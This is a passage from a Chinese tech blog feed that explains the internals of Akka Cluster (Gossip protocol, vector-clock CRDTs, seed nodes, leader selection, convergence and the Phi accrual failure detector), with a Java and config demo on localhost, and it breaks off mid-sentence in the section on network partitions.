’InitJoin‘消息，它在发送几次后，还没收到响应则自己创建了集群。等我们再启动SeedNode2的时候，SeedNode2会向SeedNode1发起链接，走的是SeedNode1的上行路径，于是bug发生了。<br>它具体原因就在下行链路的处理环节8###中没有捕获ConnectException异常，也就没有对addressToWritable相关配置进行调整。这就使得上行链路的处理环节9###无法正常往下进行。<br>该bug在今年4月份被修复，2.3.2及其之后的版本都没有问题，具体修复请查看<a href="https://github.com/akka/akka/commit/672e7f947c9d4e3499bb3667a7230685546b7f7b">https://github.com/akka/akka/commit/672e7f947c9d4e3499bb3667a7230685546b7f7b</a>，<br>虽然就是新增了一个对ConnectException异常的捕获，但分析这个bug的原因过程，还是有收获的，应该能对使用Akka的remoting、cluster模块的相关朋友有帮助。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;1-概述&quot;&gt;&lt;a href=&quot;#1-概述&quot; class=&quot;headerlink&quot; title=&quot;1.概述&quot;&gt;&lt;/a&gt;1.概述&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;  Akka这样一个scala世界里的明星，给我们提供了各种各样吸引人的功能和特性，尤其在分布式、高并发领域</summary>
      
    
    
    
    <category term="network" scheme="https://wuhaocn.github.io/categories/network/"/>
    
    
    <category term="akka" scheme="https://wuhaocn.github.io/tags/akka/"/>
    
  </entry>
  
  <entry>
    <title>Akka-Cluster原理分析</title>
    <link href="https://wuhaocn.github.io/2021/12/03/network/akka/Akka-Cluster%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/"/>
    <id>https://wuhaocn.github.io/2021/12/03/network/akka/Akka-Cluster%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/</id>
    <published>2021-12-03T08:21:48.776Z</published>
    <updated>2021-12-03T09:07:15.112Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1-概述"><a href="#1-概述" class="headerlink" title="1. 概述"></a>1. 概述</h2><pre><code> Akka remoting是Peer-to-Peer的，所以基于remote功能的cluster是一个去中心化的分布式集群。</code></pre><p>Akka Cluster将多个JVM连接整合在一起，实现消息地址的透明化和统一化使用管理，集成一体化的消息驱动系统。最终目的是将一个大型程序分割成若干子程序，部署到很多JVM上去实现程序的分布式并行运算（单机也可以起很多节点构成集群）。更重要的是, Akka Cluster集群构建与Actor编程没有直接的联系，集群构建是在ActorSystem层面上，实现了Actor消息地址的透明化，无需考虑目标运行环节是否分布式，可以按照正常的Actor编程模式进行开发。我们知道，分布式集群是由若干节点组成的，那么节点的发现及状态管理是分布式系统一个比较重要的任务。Akka Cluster中将节点的生命周期划分为：<br><a href="http://edisonxu.com/images/2018/10/member-states.png"><img src="https://cdn.nlark.com/yuque/0/2021/png/804884/1634640556096-7864b5b3-0b57-4cb2-a8d7-0162dedcd781.png#clientId=ue5ae84ed-39d6-4&crop=0&crop=0&crop=1&crop=1&from=paste&id=ufeec3256&margin=%5Bobject%20Object%5D&originHeight=343&originWidth=500&originalType=url&ratio=1&rotation=0&showTitle=false&status=done&style=none&taskId=u9d635c75-98c2-4f5a-9d85-28b8fa2397f&title="></a></p><ul><li><strong>joining</strong> - 当尝试加入集群时的初始状态</li><li><strong>up</strong> - 加入集群后的正常状态</li><li><strong>leaving / exiting</strong> - 节点退出集群时的中间状态</li><li><strong>down</strong> - 集群无法感知某节点后，将其标记为down</li><li><strong>removed</strong> - 从集群中被删除，以后也无法再加入集群</li></ul><p>其实当参数akka.cluster.allow-weakly-up-members启用时(默认是启用的)，还有个weakly up，它是用于集群出现分裂时，集群无法收敛，则leader无法将状态置为up的临时状态。这个后面再解释。<br>图中还有两个特殊的名词：</p><ul><li><strong>fd</strong>* - 这个表示akka的错误检测机制Faiulre Detector被触发后，将节点标记为unreachable</li><li><strong>unreachable</strong>* - unreachable不是一个真正的节点状态，更多的像是一个flag，用来描述集群无法与该节点进行通讯。当错误检测机制侦测到这个节点又能正常通讯时，会移除这个flag。</li></ul><p>市面上大多数产品的分布式管理一般用的是注册中心机制，例如zk、consul或etcd。其实是节点把自己的信息注册到所使用的注册中心里，而master通过接受注册中心的通知得知新节点信息。显然本质上是一种master/slave的架构。这种架构有两个问题：</p><ol><li>master节点一般是单一的，一旦挂了影响就比较大（所以很多master都采用了HA机制），也就是所谓的系统单点故障；</li><li>通常节点的地址发现是要走master去获取的，当系统并发大时，master节点就可能成为性能瓶颈，即单点性能瓶颈。</li></ol><p>Akka可能就是考虑这两点，采用了P2P的模式，这样任何一个节点都可以作为”master”，任何的节点都可以用来寻找其他节点地址。那它是怎么做到的呢？答案是<a href="http://en.wikipedia.org/wiki/Gossip_protocol">Gossip</a>协议和CRDT。</p><h2 id="2-Akka-Gossip"><a href="#2-Akka-Gossip" class="headerlink" title="2.Akka Gossip"></a>2.Akka Gossip</h2><h3 id="2-1-基本介绍"><a href="#2-1-基本介绍" class="headerlink" title="2.1.基本介绍"></a>2.1.基本介绍</h3><h4 id="2-1-1-Gossip协议"><a href="#2-1-1-Gossip协议" class="headerlink" title="2.1.1.Gossip协议"></a>2.1.1.Gossip协议</h4><pre><code>Gossip协议简单来说，就是病毒式的将信息扩散到整个集群，无法确定何时完成完全扩散，但最终是会到达完全扩散状态的（最终一致性），即收敛。具体介绍可以参考我转载的一片文章——[P2P 网络核心技术：Gossip 协议](http://edisonxu.com/2018/11/02/gossip.html)，这里就不再重复叙述，着重介绍下Akka是怎么使用Gossip的。</code></pre><h4 id="2-1-2-CRDT"><a href="#2-1-2-CRDT" class="headerlink" title="2.1.2.CRDT"></a>2.1.2.CRDT</h4><p>P2P的分布式系统中，理论上每个节点都能处理外部的请求，以及向其他节点发送请求。而系统中存在的共享变量，可能在同一时间会被两个不同节点的请求用到，即并发安全问题。一般解决方案是队列或自旋，后者本质上还是一种变相的队列。排队就牵扯到两个问题：</p><ol><li>“谁先来的”</li></ol><p>很多人下意识会觉得用时间戳就可以了嘛，但在分布式集群中，每个节点如果是一台单独的服务器，那么每个节点的时间戳未必相同（比如未开启Ntp）。</p><ol><li>“同时来的怎么办”</li></ol><p>就像git，能merge就merge，不能merge就解决冲突。<br>CRDT就是用于解决解决分布式事件的先后顺序及merge问题的数据结构的简称，即Conflict-Free Replicated Data Types的缩写，它的作用是保证最终一致性，出处参阅<a href="http://hal.upmc.fr/docs/00/55/55/88/PDF/techreport.pdf">这份论文</a>。白话文 <a href="http://liyu1981.github.io/what-is-CRDT/">谈谈CRDT</a> 和<a href="https://lfwen.site/2018/06/09/crdt-counter/">CRDT介绍</a>这两篇文章讲的通俗易懂，多的就不再重复了。<br>Akka中节点的状态就是一个特殊的CRDT，使用向量时钟Vector Clock实现方案，关于向量时钟Vector Clock可以参见我转发的这篇文章<a href="http://edisonxu.com/clocks">Vector Clock/Version Clock</a>。<br>Akka的gossip协议发送的具体内容如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">final case class Gossip(</span><br><span class="line">  members:    immutable.SortedSet[Member], // sorted set of members with their status, sorted by address</span><br><span class="line">  overview:   GossipOverview                       = GossipOverview(),</span><br><span class="line">  version:    VectorClock                          = VectorClock(), // vector clock version</span><br><span class="line">  tombstones: Map[UniqueAddress, Gossip.Timestamp] = Map.empty</span><br><span class="line">)</span><br><span class="line">final case class GossipOverview(</span><br><span class="line">  seen:         Set[UniqueAddress] = Set.empty,</span><br><span class="line">  reachability: Reachability       = Reachability.empty</span><br><span class="line">)</span><br><span class="line">class Reachability private (</span><br><span class="line">  val records:  immutable.IndexedSeq[Reachability.Record],</span><br><span class="line">  val versions: Map[UniqueAddress, Long]</span><br><span class="line">)</span><br></pre></td></tr></table></figure><ul><li><p><strong>members</strong> 存放该节点知道的其他节点</p></li><li><p><strong>seen</strong> 已经收到本次gossip的节点们，每个节点当接受到一个新的gossip消息时，会把自己放到seen里面，作为响应返回给发送者</p></li><li><p><strong>reachability</strong> 这个由错误检测机制Faiulre Detector的心跳模块来维护，用来判断节点是否存活。正常情况下records应该是空的，当有节点处于Unreachable时，才会有记录加到records里。</p></li><li><p><strong>version</strong> 向量时钟，用于冲突检测和处理</p><h4 id="2-1-3-种子节点-SeedNode"><a href="#2-1-3-种子节点-SeedNode" class="headerlink" title="2.1.3.种子节点 SeedNode"></a>2.1.3.种子节点 SeedNode</h4><p>SeendNode一般是提前配置好的一组节点。它用于接受其他节点（可以是种子节点）的加入集群的请求。不同节点，在Akka Cluster中启动时会有不同的逻辑：</p></li><li><p>如果是种子节点，并且是排序后的种子节点数组中<strong>排第一</strong>的，它会在一个规定的时间内(默认5秒)去尝试加入已存在的集群，即发送InitJoin消息到其他种子节点。如果未能成功加入，则自己将<strong>创建一个新的Cluster</strong>。</p></li><li><p>如果是种子节点，但并不是数组中排第一的，则会向其他种子节点发送InitJoin消息，如果失败将不断重试，直到能成功加入<strong>第一个返回响应的已加入集群的种子节点</strong>对应的Cluster。</p></li><li><p>如果是普通节点，则会向其他种子节点发送InitJoin消息，如果失败将不断重试，直到能成功加入<strong>第一个返回响应的已加入集群的种子节点</strong>对应的Cluster。</p></li></ul><p>这里有一点值得注意，为什么是加入第一个返回响应的种子节点所在的集群？这个问题后面再解释。</p><h2 id="3-过程详解"><a href="#3-过程详解" class="headerlink" title="3.过程详解"></a>3.过程详解</h2><p>下面用一个简单的场景来解释整个交互过程，假定我们有两个节点n1和n2，其中n1是种子节点。我们让n2先启动。<br><a href="http://edisonxu.com/images/2018/10/gossip-process.png"><img src="https://cdn.nlark.com/yuque/0/2021/png/804884/1634640555862-e792d563-5efe-4b7d-b944-8a881612e188.png#clientId=ue5ae84ed-39d6-4&crop=0&crop=0&crop=1&crop=1&from=paste&id=u6af8fcee&margin=%5Bobject%20Object%5D&originHeight=2203&originWidth=1183&originalType=url&ratio=1&rotation=0&showTitle=false&status=done&style=none&taskId=u8237b388-ef54-4d92-bf52-5f1a3e062be&title="></a><br>上图中的T0、T1表示时间轴，但只是为了方便将步骤拆解，便于理解。其中T4和T5并没有必然的时间前后关系，这里只是假定T4在前，步骤基本是类似的，T5在前也只是稍有不同。<br>#T0、T1时刻只是为了表明n2在启动时，如果没有种子节点响应，则会一直等待重试<br>#T2时刻种子节点自己新建一个集群，由于新集群只有它自己，members和seen是一样的，所以把自己作为集群的leader。</p><h4 id="3-1-leader"><a href="#3-1-leader" class="headerlink" title="3.1.leader"></a>3.1.leader</h4><ul><li>Gossip协议中没有leader选举过程</li><li>leader只是一个角色，任何节点均可以是leader</li><li>leader的确定非常简单：<strong>集群收敛后，当前members队列按IP进行排序，排第一位置的节点就是整个集群的leader</strong></li><li>leader并非一直不变，如果集群有新节点加入或某节点退出，导致发生Gossip过程，收敛后都会重新确定leader</li><li>leader的职责是更新节点在集群中的状态以及将集群的成员移入或移出集群</li></ul><p>注意，这里有个地方容易被误解：“n1和n2构成一个集群，不是在T5才收敛吗？怎么在T2就确定leader了？”<br>其实当第一个种子节点新建cluster时，由于只有它一个，即seen和members里内容一样，它判断当前集群已收敛，就把自己当作leader了。所以才有了T2_2和T4。<br>#T3时刻是n1响应n2的InitJoin请求，具体交互过程如下：<br><a href="http://edisonxu.com/images/2018/10/gossip-interact.png"><img src="https://cdn.nlark.com/yuque/0/2021/png/804884/1634640555875-9a054789-d57a-4311-b6f9-8bdca2798653.png#clientId=ue5ae84ed-39d6-4&crop=0&crop=0&crop=1&crop=1&from=paste&id=u9ab04293&margin=%5Bobject%20Object%5D&originHeight=504&originWidth=711&originalType=url&ratio=1&rotation=0&showTitle=false&status=done&style=none&taskId=u3a23d908-0c64-4373-b291-a07b093a28d&title="></a><br>#T3_0种子节点收到n2的Join消息后，会做两件事：</p><ol><li>更新当前Gossip的向量时钟；</li><li>清空当前Gossip的seen队列，然后把自己加进去。（后续发起Gossip交互时，会优先选择那些没在seen队列中的成员）</li></ol><p>#T4时刻因为作为fd能正常与n2进行心跳，n1作为leader就被通知将n2提升为Up状态<br>#T5时刻是一个CRDT的对比过程，对比两个Goissp的version，即VectorClock，比较的结果有三种：</p><ul><li><strong>Same</strong>: 相同，则进行seen队列合并就可以了</li><li><strong>Before</strong>: 本地新，则向对端发送本地的Gossip，本地不变</li><li><strong>After</strong>: 对端新，则更新本地的Gossip。如果对端的Gossip的seen里没有包含本地，则将自己添加到seen里发送给对端，以减少一次两者间的Gossip交互。</li></ul><p>#T5时刻最后集群达到了收敛</p><h4 id="3-2-Gossip-收敛"><a href="#3-2-Gossip-收敛" class="headerlink" title="3.2 Gossip 收敛"></a>3.2 Gossip 收敛</h4><p>从上面的图里可以看到节点初始化时会把自己加入到members里，回传回去，同时，节点在收到新的Gossip时，会把自己加入到seen里面。那么，在一开始，members和seen中的节点数是不同的。<br>当Gossip传递的消息被整个集群都消化掉的时候，可以称作当前集群的Gossip收敛。靠以下条件判断Gossip收敛：</p><ul><li>集群中不存在unreachable的节点，或者unreachable的节点应该均处于down或exiting状态</li><li>正常节点均处于up或leaving状态，且members里的节点都在seen里，即集群中所有的节点都收到过该Gossip<h2 id="4-代码演示"><a href="#4-代码演示" class="headerlink" title="4.代码演示"></a>4.代码演示</h2>说了那么多文字，Akka Cluster提供了监控ClusterEvent的方法，我们可以用代码来校验下上面的知识。<br>添加依赖<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;com.typesafe.akka&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;akka-cluster_2.12&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;2.5.17&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure></li></ul><p>首先编写application.conf配置文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">akka &#123;</span><br><span class="line">  actor &#123;</span><br><span class="line">    provider = &quot;cluster&quot;</span><br><span class="line">  &#125;</span><br><span class="line">  remote &#123;</span><br><span class="line">    netty.tcp &#123;</span><br><span class="line">      hostname = &quot;127.0.0.1&quot;</span><br><span class="line">      port = 0</span><br><span class="line">    &#125;</span><br><span class="line">    artery &#123;</span><br><span class="line">      enabled = on</span><br><span class="line">      canonical.hostname = &quot;127.0.0.1&quot;</span><br><span class="line">      canonical.port = 0</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  cluster &#123;</span><br><span class="line">    seed-nodes = [</span><br><span class="line">      &quot;akka://ClusterSystem@127.0.0.1:2552&quot;,</span><br><span class="line">      &quot;akka://ClusterSystem@127.0.0.1:2551&quot;</span><br><span class="line">    ]</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后，编写Actor</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">public class SimpleClusterListener extends AbstractActor &#123;</span><br><span class="line"></span><br><span class="line">    LoggingAdapter log = Logging.getLogger(getContext().system(), this);</span><br><span class="line">    Cluster cluster = Cluster.get(getContext().system());</span><br><span class="line"></span><br><span class="line">    //subscribe to cluster changes</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public void preStart() throws Exception &#123;</span><br><span class="line">        cluster.subscribe(self(), ClusterEvent.initialStateAsEvents(), ClusterEvent.MemberEvent.class, ClusterEvent.UnreachableMember.class);</span><br><span class="line">        log.info(&quot;I&#x27;m about to start! Code: &#123;&#125; &quot;, getSelf().hashCode());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public void postStop() throws Exception &#123;</span><br><span class="line">        cluster.unsubscribe(self());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public Receive createReceive() &#123;</span><br><span class="line">        return receiveBuilder()</span><br><span class="line">                .match(ClusterEvent.MemberUp.class, mUp-&gt;log.info(&quot;Member is Up: &#123;&#125;&quot;, mUp.member()))</span><br><span class="line">                .match(ClusterEvent.UnreachableMember.class, mUnreachable-&gt;log.info(&quot;Member detected as unreachable: &#123;&#125;&quot;, mUnreachable.member()))</span><br><span class="line">                .match(ClusterEvent.MemberRemoved.class, mRemoved-&gt;log.info(&quot;Member is Removed: &#123;&#125;&quot;, mRemoved.member()))</span><br><span class="line">                .match(ClusterEvent.LeaderChanged.class, msg-&gt;log.info(&quot;Leader is changed: &#123;&#125;&quot;, msg.getLeader()))</span><br><span class="line">                .match(ClusterEvent.RoleLeaderChanged.class, msg-&gt;log.info(&quot;RoleLeader is changed: &#123;&#125;&quot;, msg.getLeader()))</span><br><span class="line">                .match(ClusterEvent.MemberEvent.class, event-&gt;&#123;&#125;) //ignore</span><br><span class="line">                .build();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后是启动类</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">public class App </span><br><span class="line">&#123;</span><br><span class="line">    public static void main( String[] args )</span><br><span class="line">    &#123;</span><br><span class="line">        if(args.length==0)</span><br><span class="line">            startup(new String[] &#123;&quot;2551&quot;, &quot;2552&quot;, &quot;0&quot;&#125;);</span><br><span class="line">        else</span><br><span class="line">            startup(args);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void startup(String[] ports)&#123;</span><br><span class="line">        ExecutorService pool = Executors.newFixedThreadPool(ports.length);</span><br><span class="line">        for(String port : ports)&#123;</span><br><span class="line">            pool.submit(()-&gt;&#123;</span><br><span class="line">            // Using input port to start multiple instances</span><br><span class="line">                Config config = ConfigFactory.parseString(</span><br><span class="line">                        &quot;akka.remote.netty.tcp.port=&quot; + port + &quot;\n&quot; +</span><br><span class="line">                                &quot;akka.remote.artery.canonical.port=&quot; + port)</span><br><span class="line">                        .withFallback(ConfigFactory.load());</span><br><span class="line"></span><br><span class="line">                // Create an Akka system</span><br><span class="line">                ActorSystem system = ActorSystem.create(&quot;ClusterSystem&quot;, config);</span><br><span class="line"></span><br><span class="line">                // Create an</span><br><span class="line">                system.actorOf(Props.create(SimpleClusterListener.class), &quot;ClusterListener&quot;);</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里设置了2552和2551两个种子节点，及一个随机端口启动的普通节点。<strong>故意在配置中把2552放到2551前面去。</strong><br>带参数2551作为端口启动程序，命名为Node1，启动后，可以看到它会不断尝试连接提供的种子节点中排第一的2552</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[WARN] [11/07/2018 17:15:13.823] [ClusterSystem-akka.actor.default-dispatcher-5] [akka://ClusterSystem@127.0.0.1:2551/system/cluster/core/daemon/joinSeedNodeProcess-1] Couldn&#x27;t join seed nodes after [2] attempts, will try again. seed-nodes=[akka://ClusterSystem@127.0.0.1:2552]</span><br><span class="line">[WARN] [11/07/2018 17:15:18.835] [ClusterSystem-akka.actor.default-dispatcher-10] [akka://ClusterSystem@127.0.0.1:2551/system/cluster/core/daemon/joinSeedNodeProcess-1] Couldn&#x27;t join seed nodes after [3] attempts, will try again. seed-nodes=[akka://ClusterSystem@127.0.0.1:2552]</span><br></pre></td></tr></table></figure><p>这时带参数2552启动程序，命名为Node2，命令行会打印</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[WARN] [11/07/2018 17:15:13.823] [ClusterSystem-akka.actor.default-dispatcher-5] [akka://ClusterSystem@127.0.0.1:2551/system/cluster/core/daemon/joinSeedNodeProcess-1] Couldn&#x27;t join seed nodes after [2] attempts, will try again. seed-nodes=[akka://ClusterSystem@127.0.0.1:2552]</span><br><span class="line">[WARN] [11/07/2018 17:15:18.835] [ClusterSystem-akka.actor.default-dispatcher-10] [akka://ClusterSystem@127.0.0.1:2551/system/cluster/core/daemon/joinSeedNodeProcess-1] Couldn&#x27;t join seed nodes after [3] attempts, will try again. seed-nodes=[akka://ClusterSystem@127.0.0.1:2552]</span><br></pre></td></tr></table></figure><p>Node [akka://<a href="mailto:&#67;&#108;&#117;&#115;&#x74;&#x65;&#114;&#83;&#121;&#115;&#x74;&#101;&#x6d;&#x40;&#x31;&#x32;&#55;&#46;&#48;&#x2e;&#x30;&#x2e;&#x31;">&#67;&#108;&#117;&#115;&#x74;&#x65;&#114;&#83;&#121;&#115;&#x74;&#101;&#x6d;&#x40;&#x31;&#x32;&#55;&#46;&#48;&#x2e;&#x30;&#x2e;&#x31;</a>:2552] is JOINING itself (with roles [dc-default]) and forming new cluster 说明作为排第一的种子节点，它创建了集群并把自己加了进去。<br>Cluster Node [akka://<a href="mailto:&#67;&#x6c;&#117;&#x73;&#116;&#101;&#x72;&#x53;&#121;&#x73;&#x74;&#x65;&#x6d;&#64;&#49;&#50;&#55;&#46;&#48;&#x2e;&#48;&#46;&#49;">&#67;&#x6c;&#117;&#x73;&#116;&#101;&#x72;&#x53;&#121;&#x73;&#x74;&#x65;&#x6d;&#64;&#49;&#50;&#55;&#46;&#48;&#x2e;&#48;&#46;&#49;</a>:2552] dc [default] is the new leader 说明2552变成了leader。<br>Node [akka://<a href="mailto:&#x43;&#108;&#117;&#115;&#116;&#x65;&#x72;&#x53;&#121;&#115;&#116;&#x65;&#109;&#64;&#49;&#50;&#x37;&#x2e;&#48;&#x2e;&#48;&#46;&#49;">&#x43;&#108;&#117;&#115;&#116;&#x65;&#x72;&#x53;&#121;&#115;&#116;&#x65;&#109;&#64;&#49;&#50;&#x37;&#x2e;&#48;&#x2e;&#48;&#46;&#49;</a>:2551] is JOINING, roles [dc-default] 2551在尝试加入集群<br>Leader is moving node [akka://<a href="mailto:&#x43;&#x6c;&#117;&#x73;&#116;&#x65;&#114;&#x53;&#121;&#115;&#x74;&#101;&#x6d;&#64;&#49;&#50;&#x37;&#46;&#48;&#x2e;&#x30;&#46;&#49;">&#x43;&#x6c;&#117;&#x73;&#116;&#x65;&#114;&#x53;&#121;&#115;&#x74;&#101;&#x6d;&#64;&#49;&#50;&#x37;&#46;&#48;&#x2e;&#x30;&#46;&#49;</a>:2551] to [Up] 2551成功加入了集群，状态变为Up<br>Cluster Node [akka://<a href="mailto:&#67;&#x6c;&#x75;&#x73;&#116;&#101;&#114;&#x53;&#121;&#x73;&#x74;&#101;&#109;&#64;&#49;&#50;&#55;&#x2e;&#x30;&#x2e;&#48;&#x2e;&#x31;">&#67;&#x6c;&#x75;&#x73;&#116;&#101;&#114;&#x53;&#121;&#x73;&#x74;&#101;&#109;&#64;&#49;&#50;&#55;&#x2e;&#x30;&#x2e;&#48;&#x2e;&#x31;</a>:2552] dc [default] is no longer the leader 集群变化导致新一轮Goissp收敛后，leader重新选取，2551的IP比2552小，被选为新的leader。<br>可以从Node1的命令行看到证据：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">[INFO] [11/07/2018 17:18:25.755] [ClusterSystem-akka.actor.default-dispatcher-9] [akka.cluster.Cluster(akka://ClusterSystem)] Cluster Node [akka://ClusterSystem@127.0.0.1:2551] - Cluster Node [akka://ClusterSystem@127.0.0.1:2551] dc [default] is the new leader</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>我们再起一个参数为2900的，命名为Node3，等到正常启动，三个Node状态都为Up。</p><ul><li>2552是集群的创建者</li><li>2551是集群的leader</li></ul><p>此时，我们把2552重启，会看到2551的命令行中出现Leader is removing unreachable node [akka://<a href="mailto:&#67;&#108;&#x75;&#x73;&#x74;&#101;&#x72;&#x53;&#x79;&#115;&#116;&#x65;&#x6d;&#64;&#49;&#50;&#x37;&#46;&#48;&#46;&#x30;&#x2e;&#49;">&#67;&#108;&#x75;&#x73;&#x74;&#101;&#x72;&#x53;&#x79;&#115;&#116;&#x65;&#x6d;&#64;&#49;&#50;&#x37;&#46;&#48;&#46;&#x30;&#x2e;&#49;</a>:2552]，等2552完全启动时，可以看到Welcome from [akka://<a href="mailto:&#67;&#108;&#117;&#x73;&#x74;&#x65;&#x72;&#83;&#x79;&#x73;&#x74;&#x65;&#109;&#x40;&#49;&#x32;&#55;&#46;&#48;&#46;&#48;&#x2e;&#x31;">&#67;&#108;&#117;&#x73;&#x74;&#x65;&#x72;&#83;&#x79;&#x73;&#x74;&#x65;&#109;&#x40;&#49;&#x32;&#55;&#46;&#48;&#46;&#48;&#x2e;&#x31;</a>:2551]说明2552向2551发送的加入集群的消息，2551给它发送了Welcome消息。2552不再自己创建新的集群。有兴趣的可以在关闭2552的情况下重启node3.</p><h2 id="5-进阶"><a href="#5-进阶" class="headerlink" title="5.进阶"></a>5.进阶</h2><p>其实本来这部分应该放在上面，但是一上来讲理论非常不好消化，至少我个人是如此。所以，我宁愿把好理解的交互步骤放前面，把一些知识点穿插在里面，最后再把无法放进去的干巴巴的理论放最后。</p><h3 id="5-1-Akka对于Gossip的优化"><a href="#5-1-Akka对于Gossip的优化" class="headerlink" title="5.1.Akka对于Gossip的优化"></a>5.1.Akka对于Gossip的优化</h3><ul><li><p>如果gossiper(gossip的发送者)和recipient(goissp的接收者)拥有相同版本的Gossip(recipient已包含在seen列表里，并且version也与gossiper的完全一致)，这时Gossip的状态不用再发回给gossiper，减少交互。</p></li><li><p>akka使用的是push-pull类型gossip的变种，它每次发送的是一个digest值，而非真正的value，recipient收到后先比较版本，只有当它的版本较低时，才会去向gossiper请求真正的值。</p></li><li><p>默认情况下，集群每1秒进行一次gossip，但如果seen里的节点数少于整个集群1/2，则集群每秒钟会进行3轮gossip，以加速收敛。</p></li><li><p>在未收敛时，gossiper在选择目标节点时是随机的但带有偏向性(biased gossip)。gossiper会选择在当前版本下不在seen里的节点去交换gossip，并且选择的比例系数较高(经验值400个节点下配置为0.8)。该系数会随着轮数增加而减少，以防止单节点同时间收到过多的gossip请求。recipient对于gossip请求也是放到mailbox里的，在mailbox队列较长时，会移除较早的请求。</p></li><li><p>当收敛后，目标节点的选择就完全是随机的了，而且只发送非常小的gossip状态的消息。一旦集群发生变化，就会回到上一条所述的带有偏向性的biased gossip。</p><h3 id="5-2-Failure-Detector机制"><a href="#5-2-Failure-Detector机制" class="headerlink" title="5.2.Failure Detector机制"></a>5.2.Failure Detector机制</h3></li><li><p>职责是定期检查集群中节点是否可用</p></li><li><p>是<a href="https://pdfs.semanticscholar.org/11ae/4c0c0d0c36dc177c1fff5eb84fa49aa3e1a8.pdf">The Phi Accrual Failure Detector</a>的实现，是一种解耦了观察与行为的增量式错误检测器。它不会简单的判断节点是否可用，而是通过收集各种数据计算出phi值，通过与设定好的threshold进行对比，判断是否出现错误。</p></li><li><p>每个节点会根据集群节点的hash有序环确定临近的几个节点进行监控（默认是5个），方便跨机房进行监控，保证集群节点的全覆盖。目标节点每1秒向这些节点发送心跳。</p></li><li><p>只要有一个monitor认为某节点是unreachable状态，那么该节点就会被集群认为是unreachable</p></li><li><p>被标记为unreachable的节点，只有在所有的monitor都认为它是reachable时，它才会被重新认为是reachable，leader会重新改变它的状态</p><h3 id="5-3-网络分区与集群分区"><a href="#5-3-网络分区与集群分区" class="headerlink" title="5.3.网络分区与集群分区"></a>5.3.网络分区与集群分区</h3><p>当网络出现异常，比如一个跨两地机房的集群，机房间的网络断了。这时：</p></li><li><p>原创建集群的种子节点所在的集群，会重新发起biased 